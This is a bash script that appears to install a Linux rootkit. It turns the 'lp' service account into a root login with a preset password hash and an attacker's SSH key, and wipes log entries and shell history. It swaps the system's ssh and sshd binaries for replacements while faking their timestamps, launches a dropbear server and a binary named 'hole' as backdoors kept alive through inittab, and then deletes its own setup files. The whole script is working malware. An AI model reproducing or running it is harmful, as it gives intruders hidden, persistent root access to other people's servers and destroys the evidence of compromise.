#!/bin/bash

if [ `uname -m` = "x86_64" ]
then
ARCH=64
else
ARCH=32
fi

if [[ ! -e /usr/bin/gawk && ! -e /bin/gawk ]]
then
echo 'NO GAWK! FUCK U UBUNTU'
apt-get install gawk wget
fi

CLEANUP=$PWD

# setup account space
DIR="/var/spool/lpd"

	mkdir -p $DIR/.ssh					# need this
	rm -rf $DIR/.bash_history && ln -s /dev/null $DIR/.bash_history	# don't want a history!
	cp setup/$ARCH/nabi2 $DIR/.n
	rm -rf /var/log/sed*
	echo "rm -rf /var/log/sed*" > /var/spool/lpd/.ssh/rc
	echo "sed -i '/ lp/d' /var/log/messages*" >> /var/spool/lpd/.ssh/rc
	echo "sed -i '/ lp/d' /var/log/secure*" >> /var/spool/lpd/.ssh/rc
	echo "sed -i '/ lp/d' /var/log/auth*" >> /var/spool/lpd/.ssh/rc
	echo "$DIR/.n -z $USER" > $DIR/.ssh/rc				# u/wtmp clear on login
	mv $DIR/.ssh/rc $DIR/.bash_profile
	echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsk/qOBoxR43kYYAarZVzM0yDLmz7hGQ7nbkgmF/0PWmrKUUmWgi1UPJ2p4FQDPRj9QJlDfWfAQbVTTQQSu+tMIgUqJafhGGTPDfdYJrgLj2pGUirMn5vgrujef0XLWUbIO2D7GYoJ6//nLVvN9uKM3DbXzKiDwoBleO8jEQCbqgr0xsx+UuLuEm2l/VpCqmo648jhdmXWAZLtEF6JfSnMkR+ANdJmnvUf9pinFJ5kBXvUOxtX+EgB5Jua7i3lfEM6NpjFGEG1zE6l+OCDuhzquTueSQqcjtVesSQ+jeT8UKVULj3xnzUssb+/VjLTk6Z8+Y/Isu7fGMfn+BySMALgw== > $DIR/.ssh/authorized_keys
	echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsk/qOBoxR43kYYAarZVzM0yDLmz7hGQ7nbkgmF/0PWmrKUUmWgi1UPJ2p4FQDPRj9QJlDfWfAQbVTTQQSu+tMIgUqJafhGGTPDfdYJrgLj2pGUirMn5vgrujef0XLWUbIO2D7GYoJ6//nLVvN9uKM3DbXzKiDwoBleO8jEQCbqgr0xsx+UuLuEm2l/VpCqmo648jhdmXWAZLtEF6JfSnMkR+ANdJmnvUf9pinFJ5kBXvUOxtX+EgB5Jua7i3lfEM6NpjFGEG1zE6l+OCDuhzquTueSQqcjtVesSQ+jeT8UKVULj3xnzUssb+/VjLTk6Z8+Y/Isu7fGMfn+BySMALgw== > /usr/k
	chmod 0600 $DIR/.ssh/authorized_keys				# key based login + right permissions

# setup account login details w/o manual fidgeting

	sed -i '/lp:/clp:x:0:7:Printing daemon:/var/spool/lpd:/bin/bash' /etc/passwd
	sed -i '/lp:/clp:$1$Aa3Xr4vC$Eqdhuu5/1OSZ7rm83RLoy0:14408:0:99999:7:::' /etc/shadow


chown -R root:root setup
for UTIL in ssh sshd scp sftp sftp-server rat
do
	rm -rf /bin/$UTIL
	mkdir setup
	LOCATION=$(whereis $UTIL | gawk '{print $2}')
	CTIME=$(ls -l --time=ctime --time-style=+%m%d%I%M%y.%S $LOCATION | gawk '{print $6}') 
	touch setup/temp -r $LOCATION   # gives the a/m time reference
	cur_date=$(date +%m%d%I%M%y.%S)
	date $CTIME
	cp -f setup/$ARCH/$UTIL "$LOCATION"
	cp -f setup/$ARCH/$UTIL "/bin"
	touch $LOCATION -r setup/temp 
	date $cur_date
	rm -rf setup/temp
done

sed -i '/UsePAM/d' /etc/ssh/sshd_config
sed -i '/GSSAPICleanupCredentials/d' /etc/ssh/sshd_config
sed -i '/GSSAPIAuthentication/d' /etc/ssh/sshd_config
sed -i '/PasswordAuthentication/d' /etc/ssh/sshd_config
sed -i '/GSSAPI/d' /etc/ssh/ssh_config
mkdir -p /var/empty

# install utilities that are always/frequently/sometimes/rarely missing

if [[ $ARCH = '32' ]]
then
	rpm -vhU http://nmap.org/dist/nmap-5.51-1.i386.rpm
	rpm -vhU http://www.nano-editor.org/dist/v2.2/RPMS/nano-2.2.6-1.i386.rpm
fi

if [[ $ARCH = '64' ]]
then
	rpm -vhU http://nmap.org/dist/nmap-5.51-1.x86_64.rpm
	rpm -vhU http://www.nano-editor.org/dist/v2.2/RPMS/nano-2.2.6-1.x86_64.rpm
fi

# setup backdoors

	CTIME=$(ls -l --time=ctime --time-style=+%m%d%I%M%y.%S /bin/bash | gawk '{print $6}')
	mkdir setup
        touch setup/temp -r /bin/bash   # gives the a/m time reference
        cur_date=$(date +%m%d%I%M%y.%S)
        date $CTIME
	sed /A1d:12345/d -i /etc/inittab # cleanup previous instances
	sed /A2d:12345/d -i /etc/inittab # cleanup previous instances
	rm -rf /var/usb/pts
	if [[ ! -e /usr/r.key ]] # do not want to over-write existing keys
	then
		setup/$ARCH/dropbearkey -t rsa -f /usr/r.key -s 2048
	fi
	chmod 0600 /usr/r.key
	chmod 0600 /usr/k
	cp setup/$ARCH/dropbear /sbin/ssh2
	cp setup/$ARCH/nabi2 /bin/n
	cp setup/$ARCH/nabi2 /sbin/nab
	mkdir -p /var/usb
	touch /var/usb -r /bin/bash
        mv -f setup/$ARCH/hole /var/usb/pts
        touch /var/usb/pts -r /bin/bash
	/var/usb/pts &
	/sbin/ssh2 &
	echo "A1d:12345:boot:/var/usb/pts &" >> /etc/inittab
	echo "A2d:12345:boot:/sbin/ssh2 &" >> /etc/inittab
        date $cur_date
        rm -rf setup/temp

# cleanup
PID=`cat /var/run/ssh*`
kill -9 $PID
A=/etc/init.d/sshd
B=/etc/init.d/ssh

if [ -e $B ]
	then /etc/init.d/ssh restart
	else /etc/init.d/sshd restart
fi

rm -rf $CLEANUP/setup $CLEANUP/script $CLEANUP/setup.* $CLEANUP/exploits